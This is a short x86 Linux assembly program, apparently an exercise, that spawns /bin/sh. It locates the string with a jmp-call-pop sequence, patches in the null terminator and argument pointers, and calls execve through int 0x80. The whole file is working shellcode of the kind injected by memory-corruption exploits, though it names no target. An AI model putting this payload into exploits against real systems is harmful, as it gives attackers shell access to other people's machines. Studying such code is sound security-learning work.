; Author: d4rk-c1ph3r
; An assembly program to execute /bin/sh


	section .text
	global _start
_start:
	
	jmp short payload
shellcode:
	pop esi

	;making /bin/sh null terminated
	xor ebx, ebx
	mov byte [esi+7], bl

	; Moving the address of esi into the location of BBBB
	mov dword [esi+8], esi

	; Making CCCC null
	mov dword [esi+12], ebx

	; loading the arguments
	lea ebx, [esi]
	lea ecx, [esi+8]
	
	; Address of Nulls
	lea edx, [esi+12]

	xor eax, eax
	mov al, 0xb
	int 0x80
	
	; No need for exit syscall

payload:
	call shellcode
	message: db "/bin/shABBBBCCCC"
